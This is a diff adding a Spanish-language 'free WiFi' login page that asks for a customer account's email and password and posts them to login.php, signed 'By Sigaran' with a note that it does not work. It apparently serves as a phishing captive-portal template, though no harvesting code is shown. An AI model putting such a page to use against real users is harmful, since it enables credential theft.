@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso WiFi Seguro</title>
+    <style>
+        body {
+            background: #004080;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            width: 320px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.4);
+            text-align: center;
+        }
+        .login-box img {
+            width: 100px;
+            margin-bottom: 15px;
+        }
+        .login-box h2 {
+            color: #004080;
+            margin-bottom: 15px;
+        }
+        .login-box input {
+            width: 90%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-box button {
+            width: 95%;
+            padding: 12px;
+            background: #004080;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin-top: 10px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .login-box button:hover {
+            background: #003366;
+        }
+        .terms {
+            font-size: 12px;
+            color: #555;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="LOG4iIni.png" alt="WiFi Logo">
+        <h2>Acceso WiFi Gratuito</h2>
+        <p>Inicia sesión con tu cuenta de cliente:</p>
+        <form method="POST" action="login.php">
+            <input type="email" name="usuario" placeholder="Correo electrónico" required><br>
+            <input type="password" name="password" placeholder="Contraseña" required><br>
+            <button type="submit">Conectar</button>
+        </form>
+        <div class="terms">
+            Al conectarte aceptas nuestros <a href="#">términos y condiciones</a>.
+        </div>
+    </div>
+</body>
+</html>
+
+<!-- No funciona-->>
+ <!-- By Sigaran-->>
